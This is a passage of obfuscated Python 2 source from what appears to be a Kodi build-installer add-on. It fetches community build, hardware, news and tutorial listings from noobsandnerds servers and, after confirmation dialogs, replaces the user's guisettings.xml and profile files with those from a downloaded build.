  i1II = O0OoO000O0OO . yesno ( 'No Content Found' , 'This add-on cannot be found on the Add-on Portal.' , '' , 'Would you like to remove this item from your setup?' )
  if 92 - 92: OOo00O0 + oOoO0o00OO0
  if i1II == 1 : print "remove"
  if 52 - 52: II111iiii / I1IiiI . ooOo * oOoO0o00OO0 . iii1I11ii1i1
 else :
  O0OoO000O0OO . ok ( 'No Content Found' , 'Sorry no content can be found that matches' , 'your search criteria.' , '' )
  if 25 - 25: i11iIiiIii / OoOoOO00 - iI1iiIiiII / OoO0O00 . o0oOOo0O0Ooo . o0oOOo0O0Ooo
  if 6 - 6: ooOo . iii1I11ii1i1
def iIIII1 ( url ) :
 if zip == '' :
  O0OoO000O0OO . ok ( 'Storage/Download Folder Not Set' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  o0O . openSettings ( sys . argv [ 0 ] )
  if 65 - 65: O0 / II111iiii . iIii1I11I1II1 . ooOo / Oo0Ooo % iIii1I11I1II1
 if o0O . getSetting ( 'adult' ) == 'true' :
  iI1 = ''
  if 74 - 74: i1IIi / I1IiiI % I1ii11iIi11i / O0 % iii1I11ii1i1 - OoOoOO00
 else :
  iI1 = 'no'
  if 31 - 31: I1IiiI / OoooooooOO . iIii1I11I1II1 * OoOoOO00 . OoooooooOO + II111iiii
 if not 'id=' in url :
  oO00oOoo00o0 = 'http://120.24.252.100/TI/Community_Builds/sortby.php?sortx=name&orderx=ASC&adult=%s&%s' % ( iI1 , url )
  IIo0o0O0O00oOOo = iIIIiIi ( oO00oOoo00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  if 8 - 8: I1ii11iIi11i * I1ii11iIi11i * i1IIi + oo0oooooO0 . I1ii11iIi11i
  i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)"  <br> id="(.+?)"  <br> Thumbnail="(.+?)"  <br> Fanart="(.+?)"  <br> downloads="(.+?)"  <br> <br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
  if i11111I1IOoo0ooOOOOoOo == [ ] :
   if 100 - 100: OoooooooOO - O0 . iii1I11ii1i1 / iii1I11ii1i1 + II111iiii * OoOoOO00
   i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> Thumbnail="(.+?)" <br> Fanart="(.+?)" <br> downloads="(.+?)" <br> <br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
  I1i ( url , 'communitybuilds' )
  if 37 - 37: Oo0Ooo
  for ooO , id , O00Oo00o00O , i11IoO0000O0Oo00O , I1i11111i1i11 in i11111I1IOoo0ooOOOOoOo :
   i1iIIIi1i ( ooO + '[COLOR=lime] (' + I1i11111i1i11 + ' downloads)[/COLOR]' , id + url , 'community_menu' , O00Oo00o00O , i11IoO0000O0Oo00O , id , '' , '' , '' , '' )
   if 42 - 42: i11iIiiIii / I1IiiI - OoO0O00 - OOo00O0 + II111iiii % OOo00O0
 if 'id=1' in url : oO00oOoo00o0 = oo0o0O00
 if 'id=2' in url : oO00oOoo00o0 = i1iiIIiiI111
 if 'id=3' in url : oO00oOoo00o0 = i1iiIII111ii
 if 'id=4' in url : oO00oOoo00o0 = ii11iIi1I
 if 'id=5' in url : oO00oOoo00o0 = OOooO0OOoo
 if 50 - 50: OoooooooOO + ooOo * I1IiiI - OO0oo0oOO / i11iIiiIii
 IIo0o0O0O00oOOo = iIIIiIi ( oO00oOoo00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 5 - 5: O0 - I1IiiI
 for ooO , url , i1oOOOOOOOoO , I1 , i1i1IIii1i1 in i11111I1IOoo0ooOOOOoOo :
  if not 'viewport' in ooO :
   iIiIIi1 ( 'addon' , ooO , url , 'restore_local_CB' , i1oOOOOOOOoO , I1 , i1i1IIii1i1 , '' )
   if 44 - 44: II111iiii . II111iiii + Oo * OO0oo0oOO
   if 16 - 16: II111iiii
def oooOO0OO0 ( url ) :
 oO00oOoo00o0 = 'http://noobsandnerds.com/TI/HardwarePortal/sortby.php?sortx=Added&orderx=DESC&%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( oO00oOoo00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 10 - 10: I1IiiI / I1ii11iIi11i
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)"  <br> id="(.+?)"  <br> thumb="(.+?)"  <br><br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 if i11111I1IOoo0ooOOOOoOo == [ ] :
  if 68 - 68: Oo - OoooooooOO
  i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> thumb="(.+?)" <br><br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 I1i ( oO00oOoo00o0 , 'hardware' )
 if 14 - 14: O0 / ooOo - Oo0Ooo - oOoO0o00OO0
 for ooO , id , ii11III in i11111I1IOoo0ooOOOOoOo :
  iIiIIi1 ( 'folder2' , ooO , id , 'hardware_final_menu' , ii11III , '' , '' )
  if 42 - 42: I1ii11iIi11i
  if 96 - 96: ooOo % i1IIi / o0oOOo0O0Ooo
def Ii1IIi11 ( url ) :
 oO00oOoo00o0 = 'http://noobsandnerds.com/TI/LatestNews/sortby.php?sortx=item_date&orderx=DESC&%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( oO00oOoo00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 47 - 47: O0
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)"  <br> date="(.+?)"  <br> source="(.+?)"  <br> id="(.+?)"  <br><br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 if i11111I1IOoo0ooOOOOoOo == [ ] :
  if 83 - 83: O0 + OoOoOO00 / O0 / iii1I11ii1i1
  i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)" <br> date="(.+?)" <br> source="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 for ooO , OoIi11ii1 , iiiIiiiI1I , id in i11111I1IOoo0ooOOOOoOo :
  if 6 - 6: OoO0O00
  if "OpenELEC" in iiiIiiiI1I :
   iIiIIi1 ( '' , ooO + '  (' + OoIi11ii1 + ')' , id , 'news_menu' , 'OpenELEC.png' , '' , '' )
   if 99 - 99: o0oOOo0O0Ooo * Oo % ooOo * ooOo + OoooooooOO
  if "Official" in iiiIiiiI1I :
   iIiIIi1 ( '' , ooO + '  (' + OoIi11ii1 + ')' , id , 'news_menu' , 'XBMC.png' , '' , '' )
   if 82 - 82: iii1I11ii1i1 / OoOoOO00 - Oo / OOo00O0
  if "Raspbmc" in iiiIiiiI1I :
   iIiIIi1 ( '' , ooO + '  (' + OoIi11ii1 + ')' , id , 'news_menu' , 'Raspbmc.png' , '' , '' )
   if 50 - 50: Oo + OoO0O00 . i11iIiiIii + I1ii11iIi11i + i11iIiiIii
  if "XBMC4Xbox" in iiiIiiiI1I :
   iIiIIi1 ( '' , ooO + '  (' + OoIi11ii1 + ')' , id , 'news_menu' , 'XBMC4Xbox.png' , '' , '' )
   if 31 - 31: ooOo * iI1iiIiiII . OoOoOO00 * iii1I11ii1i1
  if "noobsandnerds" in iiiIiiiI1I :
   iIiIIi1 ( '' , ooO + '  (' + OoIi11ii1 + ')' , id , 'news_menu' , 'noobsandnerds.png' , '' , '' )
   if 28 - 28: oOoO0o00OO0 + I1IiiI - Oo0Ooo % Oo . iii1I11ii1i1 + I1IiiI
   if 72 - 72: OO0oo0oOO / Oo0Ooo / ooOo * OoOoOO00 + Oo
def OOoo0OOOo0o ( url ) :
 oO00oOoo00o0 = 'http://noobsandnerds.com/TI/TutorialPortal/sortby.php?sortx=Name&orderx=ASC&%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( oO00oOoo00o0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 10 - 10: iI1iiIiiII
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)"  <br> about="(.+?)"  <br> id="(.+?)"  <br><br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 if i11111I1IOoo0ooOOOOoOo == [ ] :
  if 48 - 48: oo0oooooO0 * i1IIi % OoooooooOO * OO0oo0oOO * OoO0O00
  i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)" <br> about="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 I1i ( oO00oOoo00o0 , 'tutorials' )
 if 7 - 7: oo0oooooO0 . OO0oo0oOO . oo0oooooO0 - iI1iiIiiII
 for ooO , I1IiiIi11 , id in i11111I1IOoo0ooOOOOoOo :
  iIiIIi1 ( 'folder' , ooO , id , 'tutorial_final_menu' , 'Tutorials.png' , '' , I1IiiIi11 )
  if 20 - 20: Oo - oo0oooooO0 / Oo0Ooo * OoO0O00
  if 55 - 55: OoooooooOO
def OO0OOOOOo ( url , local ) :
 III1II1i ( )
 i1II = xbmcgui . Dialog ( ) . yesno ( ooO , 'This will over-write your existing guisettings.xml.' , 'Are you sure this is the build you have installed?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if 7 - 7: O0 + OO0oo0oOO . II111iiii
 if i1II == 1 :
  iii11i1i1 ( url , local )
  if 97 - 97: I1ii11iIi11i
  if 86 - 86: Oo0Ooo - Oo . OoOoOO00 . II111iiii * I1IiiI . II111iiii
def iii11i1i1 ( url , local ) :
 II1Ooo0000o00OO = False
 IiiiIIIi11ii1 = 0
 O00Oo00OOoO0 = 1
 if 99 - 99: OoO0O00 / i1IIi . I1ii11iIi11i
 if os . path . exists ( ooOooo000oOO ) :
  os . remove ( ooOooo000oOO )
  if 23 - 23: OO0oo0oOO * OOo00O0 - iii1I11ii1i1 . O0 % iIii1I11I1II1
 if os . path . exists ( I11i1 ) :
  os . remove ( I11i1 )
  if 19 - 19: I1IiiI
 if os . path . exists ( I1I ) :
  os . remove ( I1I )
  if 66 - 66: ooOo / OoOoOO00
 if not os . path . exists ( Oo0oOOo ) :
  os . makedirs ( Oo0oOOo )
  if 13 - 13: II111iiii
  if 55 - 55: Oo0Ooo % i1IIi * iii1I11ii1i1
 try :
  shutil . copyfile ( O00o0OO , ooOooo000oOO )
  if 95 - 95: Oo / II111iiii - o0oOOo0O0Ooo % iI1iiIiiII . iii1I11ii1i1
 except :
  print "No guisettings found, most likely due to a previously failed attempt at install"
  if 63 - 63: iIii1I11I1II1 / OOo00O0
 if local != 1 :
  II1iOOoOooO0o = os . path . join ( iIo00O , 'guifix.zip' )
  if 28 - 28: oOoO0o00OO0 + i11iIiiIii + OoooooooOO / OoO0O00
 else :
  II1iOOoOooO0o = xbmc . translatePath ( url )
  if 6 - 6: I1IiiI - i11iIiiIii
  if 61 - 61: iI1iiIiiII * I1ii11iIi11i % I1IiiI % OoO0O00 % iii1I11ii1i1 + iii1I11ii1i1
 i1111I = str ( os . path . getsize ( II1iOOoOooO0o ) )
 iiI1IiI . create ( "Installing Skin Fix" , "Checking " , '' , 'Please Wait' )
 iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
 O0OoOoO00O ( II1iOOoOooO0o , Oo0oOOo , iiI1IiI )
 if 58 - 58: OoooooooOO - iii1I11ii1i1 + iIii1I11I1II1 * i11iIiiIii
 if local != 'library' or local != 'updatelibrary' or local != 'fresh' :
  if 80 - 80: i1IIi . I1IiiI - ooOo + Oo + oo0oooooO0 % ooOo
  try :
   IiiII = open ( Oo0oOOo + 'profiles.xml' , mode = 'r' )
   I1ii1iI = IiiII . read ( )
   IiiII . close ( )
   if 32 - 32: OoooooooOO
   if os . path . exists ( Oo0oOOo + 'profiles.xml' ) :
    if 77 - 77: iIii1I11I1II1 * ooOo
    if local == None :
     i1II = xbmcgui . Dialog ( ) . yesno ( "PROFILES DETECTED" , 'This build has profiles included, would you like to overwrite your existing profiles or keep the ones you have?' , '' , '' , nolabel = 'Keep my profiles' , yeslabel = 'Use new profiles' )
     if 15 - 15: iIii1I11I1II1 . Oo . I1ii11iIi11i * i11iIiiIii
    if local != None :
     i1II = 1
     if 72 - 72: iii1I11ii1i1
    if i1II == 1 :
     O00ooOo = open ( I1I , mode = 'w' )
     time . sleep ( 1 )
     O00ooOo . write ( I1ii1iI )
     time . sleep ( 1 )
     O00ooOo . close ( )
     O00Oo00OOoO0 = 0
     if 26 - 26: oOoO0o00OO0 % Oo0Ooo
  except :
   print "no profiles.xml file"
   if 72 - 72: O0 + o0oOOo0O0Ooo + I1IiiI / Oo0Ooo
   if 83 - 83: oOoO0o00OO0 - I1IiiI . OO0oo0oOO
 os . rename ( Oo0oOOo + 'guisettings.xml' , I11i1 )
 if 34 - 34: OoOoOO00 - ooOo * OoooooooOO
 if local != 'fresh' :
  IiI1I1IIIi1i = O0OoO000O0OO . yesno ( "Do You Want To Keep Your Kodi Settings?" , 'Would you like to keep your existing settings or would you rather erase them and install the ones associated with this latest build?' , nolabel = 'Keep my settings' , yeslabel = 'Replace my settings' )
  if 73 - 73: O0 * iI1iiIiiII . i1IIi
 if local == 'fresh' :
  IiI1I1IIIi1i = 1
  if 51 - 51: OoO0O00 - oo0oooooO0 % O0 - OoOoOO00
 if IiI1I1IIIi1i == 1 :
  if 53 - 53: oo0oooooO0 / i1IIi / i1IIi
  if os . path . exists ( O00o0OO ) :
   if 77 - 77: iii1I11ii1i1 + i1IIi . iii1I11ii1i1
   try :
    print "Attempting to remove guisettings"
    os . remove ( O00o0OO )
    II1Ooo0000o00OO = True
    if 89 - 89: o0oOOo0O0Ooo + Oo * ooOo
   except :
    print "Problem removing guisettings"
    II1Ooo0000o00OO = False
    if 45 - 45: oo0oooooO0 - o0oOOo0O0Ooo . OO0oo0oOO
   try :
    print "Attempting to replace guisettings with new"
    os . rename ( I11i1 , O00o0OO )
    II1Ooo0000o00OO = True
    if 41 - 41: II111iiii . I1IiiI / OoO0O00 . OOo00O0
   except :
    print "Failed to replace guisettings with new"
    II1Ooo0000o00OO = False
    if 58 - 58: oOoO0o00OO0 % i11iIiiIii * II111iiii . I1ii11iIi11i
    if 94 - 94: i11iIiiIii . Oo + iIii1I11I1II1 * iI1iiIiiII * iI1iiIiiII
 if IiI1I1IIIi1i == 0 :
  Oo0oO00 = open ( ooOooo000oOO , mode = 'r' )
  O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
  Oo0oO00 . close ( )
  if 36 - 36: iii1I11ii1i1 - oOoO0o00OO0 . oOoO0o00OO0
  Oo0OOOO0oOoo0 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( O0oiIiiiiI1II1I1 )
  O0OIIII1i = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( O0oiIiiiiI1II1I1 )
  i1I1Iiii = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( O0oiIiiiiI1II1I1 )
  I1iIIIiiii = Oo0OOOO0oOoo0 [ 0 ] if ( len ( Oo0OOOO0oOoo0 ) > 0 ) else ''
  I1111 = O0OIIII1i [ 0 ] if ( len ( O0OIIII1i ) > 0 ) else ''
  o00oO0o0oo0O = i1I1Iiii [ 0 ] if ( len ( i1I1Iiii ) > 0 ) else ''
  if 74 - 74: II111iiii % iii1I11ii1i1 . OoO0O00 * OoO0O00
  if 27 - 27: iii1I11ii1i1 * Oo0Ooo . OO0oo0oOO . I1IiiI % II111iiii - ooOo
  OooO0O0Ooo = open ( I11i1 , mode = 'r' )
  oO0O = OooO0O0Ooo . read ( )
  OooO0O0Ooo . close ( )
  if 52 - 52: I1IiiI % OoO0O00 * OO0oo0oOO * oo0oooooO0 / Oo
  oooO00oo0 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oO0O )
  o000 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oO0O )
  oOiiIIIII = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oO0O )
  iiI1 = oooO00oo0 [ 0 ] if ( len ( oooO00oo0 ) > 0 ) else ''
  iii11i1 = o000 [ 0 ] if ( len ( o000 ) > 0 ) else ''
  IIi = oOiiIIIII [ 0 ] if ( len ( oOiiIIIII ) > 0 ) else ''
  i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( I1iIIIiiii , iiI1 ) . replace ( o00oO0o0oo0O , IIi ) . replace ( I1111 , iii11i1 )
  if 12 - 12: OO0oo0oOO % oo0oooooO0 + OoO0O00 + II111iiii / o0oOOo0O0Ooo
  O00ooOo = open ( ooOooo000oOO , mode = 'w+' )
  O00ooOo . write ( str ( i1iiiIii11 ) )
  O00ooOo . close ( )
  if 89 - 89: OO0oo0oOO . I1IiiI / OoO0O00 + iI1iiIiiII + II111iiii
  if 73 - 73: I1IiiI % I1ii11iIi11i + OoooooooOO
  if os . path . exists ( O00o0OO ) :
   if 21 - 21: ooOo * ooOo / iii1I11ii1i1 . oo0oooooO0
   try :
    os . remove ( O00o0OO )
    II1Ooo0000o00OO = True
    if 10 - 10: OO0oo0oOO * Oo - Oo0Ooo - OoooooooOO / o0oOOo0O0Ooo
   except :
    II1Ooo0000o00OO = False
    if 86 - 86: iI1iiIiiII % I1IiiI
  try :
   os . rename ( ooOooo000oOO , O00o0OO )
   os . remove ( I11i1 )
   II1Ooo0000o00OO = True
   if 22 - 22: i11iIiiIii * iI1iiIiiII . Oo0Ooo . OoooooooOO + I1IiiI
  except :
   II1Ooo0000o00OO = False
   if 24 - 24: II111iiii / OO0oo0oOO . iIii1I11I1II1 - II111iiii % O0
   if 8 - 8: OoO0O00 % oo0oooooO0 . OoooooooOO - OO0oo0oOO % OoooooooOO
 if II1Ooo0000o00OO == True or local == None :
  if 61 - 61: o0oOOo0O0Ooo / i11iIiiIii
  try :
   Oo0oO00 = open ( iiii11I , mode = 'r' )
   O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
   Oo0oO00 . close ( )
   if 28 - 28: Oo / OoOoOO00
   iII1IiiIIIIii = re . compile ( 'id="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
   oOOO = re . compile ( 'name="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
   Iii1IiiII1Ii1 = re . compile ( 'version="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
   iiiIIi = iII1IiiIIIIii [ 0 ] if ( len ( iII1IiiIIIIii ) > 0 ) else ''
   OOoOo0O00oo = oOOO [ 0 ] if ( len ( oOOO ) > 0 ) else ''
   i1Ii11I1II = Iii1IiiII1Ii1 [ 0 ] if ( len ( Iii1IiiII1Ii1 ) > 0 ) else ''
   if 70 - 70: OoooooooOO % OoooooooOO % OoO0O00
   O00ooOo = open ( Ooo0OO0oOO , mode = 'w+' )
   O00ooOo . write ( 'id="' + str ( iiiIIi ) + '"\nname="' + OOoOo0O00oo + '"\nversion="' + i1Ii11I1II + '"\ngui="' + i1111I + '"' )
   O00ooOo . close ( )
   if 98 - 98: OoO0O00
   Oo0oO00 = open ( Iii111II , mode = 'r' )
   O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
   Oo0oO00 . close ( )
   if 18 - 18: iii1I11ii1i1 + Oo0Ooo - OoO0O00 / iI1iiIiiII / Oo
   OOoOoO = re . compile ( 'version="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
   IIIi1I1IIii1II = OOoOoO [ 0 ] if ( len ( OOoOoO ) > 0 ) else ''
   i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( IIIi1I1IIii1II , i1Ii11I1II )
   if 72 - 72: OoOoOO00 / iI1iiIiiII * oOoO0o00OO0 % iIii1I11I1II1
   O00ooOo = open ( Iii111II , mode = 'w' )
   O00ooOo . write ( str ( i1iiiIii11 ) )
   O00ooOo . close ( )
   os . remove ( iiii11I )
   if 53 - 53: OoO0O00 . O0 . I1IiiI * Oo / o0oOOo0O0Ooo
  except :
   O00ooOo = open ( Ooo0OO0oOO , mode = 'w+' )
   O00ooOo . write ( 'id="None"\nname="Unknown"\nversion="Unknown"\ngui="' + i1111I + '"' )
   O00ooOo . close ( )
   if 34 - 34: OoOoOO00
   if 16 - 16: i1IIi - iI1iiIiiII - II111iiii
 if os . path . exists ( Oo0oOOo + 'profiles.xml' ) :
  os . remove ( Oo0oOOo + 'profiles.xml' )
  time . sleep ( 1 )
  if 83 - 83: I1IiiI - OoO0O00 - o0oOOo0O0Ooo / O0 - iii1I11ii1i1 . II111iiii
 if os . path . exists ( Oo0oOOo ) :
  os . removedirs ( Oo0oOOo )
  if 27 - 27: OO0oo0oOO
 O0Oo0 = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'notification.txt' ) )
 if 88 - 88: OoooooooOO + OOo00O0 % oo0oooooO0 . OoooooooOO . oOoO0o00OO0
 if os . path . exists ( O0Oo0 ) :
  os . remove ( O0Oo0 )
  if 33 - 33: o0oOOo0O0Ooo . Oo + o0oOOo0O0Ooo / I1ii11iIi11i . Oo0Ooo + OoOoOO00
 if II1Ooo0000o00OO == True :
  I1111111 ( )
  o0OOOoOO00o ( )
  if 56 - 56: Oo0Ooo * iii1I11ii1i1 / OoO0O00 . i11iIiiIii - O0 / Oo0Ooo
  if 26 - 26: i11iIiiIii - OoOoOO00 / Oo . ooOo / oo0oooooO0 * oOoO0o00OO0
def OOO000oo0 ( url ) :
 iIII1I111III = 'http://noobsandnerds.com/TI/HardwarePortal/hardwaredetails.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiI1iIiiI1iI = re . compile ( 'manufacturer="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiIi1Ii = re . compile ( 'video_guide1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiIIiI11II1 = re . compile ( 'video_guide2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oooOo = re . compile ( 'video_guide3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOoO0Oo0 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i11i11i = re . compile ( 'video_guide5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1iI = re . compile ( 'video_label1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ooo00O0 = re . compile ( 'video_label2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoO0OOoO0 = re . compile ( 'video_label3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI11i = re . compile ( 'video_label4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0Oo = re . compile ( 'video_label5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii11I1I1I11i = re . compile ( 'shops="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II11iI1iiI = re . compile ( 'description="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOooOo00o = re . compile ( 'screenshot1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iI1IIi = re . compile ( 'screenshot2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II11oo0o0O = re . compile ( 'screenshot3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooo0ooooo0o = re . compile ( 'screenshot4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIII = re . compile ( 'screenshot5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii1IIi1I11i = re . compile ( 'screenshot6="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0o0oOooOoo = re . compile ( 'screenshot7="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOo0O0 = re . compile ( 'screenshot8="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIi1iI = re . compile ( 'screenshot9="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIII1iII1i = re . compile ( 'screenshot10="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0OO00OoO00 = re . compile ( 'screenshot11="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O00o = re . compile ( 'screenshot12="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii11Iiii1iiii = re . compile ( 'screenshot13="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i1IIII1111 = re . compile ( 'screenshot14="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ooo0o0000OO = re . compile ( 'added="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOoOO0ooo = re . compile ( 'platform="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIiI1II1I1 = re . compile ( 'chipset="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OooiIiI1i1Ii = re . compile ( 'official_guide="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Oo0o00o = re . compile ( 'official_preview="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0oO00oOOooO = re . compile ( 'thumbnail="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 III1I1 = re . compile ( 'stock_rom="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iI1IIIIII = re . compile ( 'CPU="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OO0oO0Oo = re . compile ( 'GPU="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoooOO0 = re . compile ( 'RAM="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oo0OoO = re . compile ( 'flash="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIi1iii1 = re . compile ( 'wifi="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o00o0 = re . compile ( 'bluetooth="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOoOo0O0 = re . compile ( 'LAN="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1o0 = re . compile ( 'xbmc_version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1IiiiiI1i1I = re . compile ( 'pros="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I11i1I1 = re . compile ( 'cons="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooOooO = re . compile ( 'library_scan="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oooo = re . compile ( '4k="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIiI1iIIII = re . compile ( '1080="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0oo00OOOo = re . compile ( '720="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oo0oO = re . compile ( '3D="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i1i1IIi = re . compile ( 'DTS="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0oo0Ooo0 = re . compile ( 'BootTime="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0OOoO = re . compile ( 'CopyFiles="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1iII1II1I1ii = re . compile ( 'CopyVideo="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oo0OO0O = re . compile ( 'EthernetTest="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OO0OooOOoO00OO00 = re . compile ( 'Slideshow="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii11ii1iIiI1 = re . compile ( 'total_review="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOo0oO0 = re . compile ( 'whufclee_review="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i111iIi1i1 = re . compile ( 'CB_Premium="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 65 - 65: OoOoOO00 . II111iiii % oo0oooooO0 + OO0oo0oOO
 ooO = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 IIIiii11 = IiI1iIiiI1iI [ 0 ] if ( len ( IiI1iIiiI1iI ) > 0 ) else ''
 O00oO0 = IiIi1Ii [ 0 ] if ( len ( IiIi1Ii ) > 0 ) else 'None'
 O0Oo00OoOo = iiIIiI11II1 [ 0 ] if ( len ( iiIIiI11II1 ) > 0 ) else 'None'
 ii1ii111 = oooOo [ 0 ] if ( len ( oooOo ) > 0 ) else 'None'
 i11111I1I = oOoO0Oo0 [ 0 ] if ( len ( oOoO0Oo0 ) > 0 ) else 'None'
 ii1Oo0000oOo = i11i11i [ 0 ] if ( len ( i11i11i ) > 0 ) else 'None'
 Iii = iiI1iI [ 0 ] if ( len ( iiI1iI ) > 0 ) else 'None'
 I1iiiiI1iI = Ooo00O0 [ 0 ] if ( len ( Ooo00O0 ) > 0 ) else 'None'
 iIiiiii1i = OoO0OOoO0 [ 0 ] if ( len ( OoO0OOoO0 ) > 0 ) else 'None'
 iiIi1IIiI = iiI11i [ 0 ] if ( len ( iiI11i ) > 0 ) else 'None'
 i1oO0OO0 = o0Oo [ 0 ] if ( len ( o0Oo ) > 0 ) else 'None'
 iI11ii = Ii11I1I1I11i [ 0 ] if ( len ( Ii11I1I1I11i ) > 0 ) else ''
 i1i1IIii1i1 = II11iI1iiI [ 0 ] if ( len ( II11iI1iiI ) > 0 ) else ''
 oOoooO00OO0o = OoOooOo00o [ 0 ] if ( len ( OoOooOo00o ) > 0 ) else ''
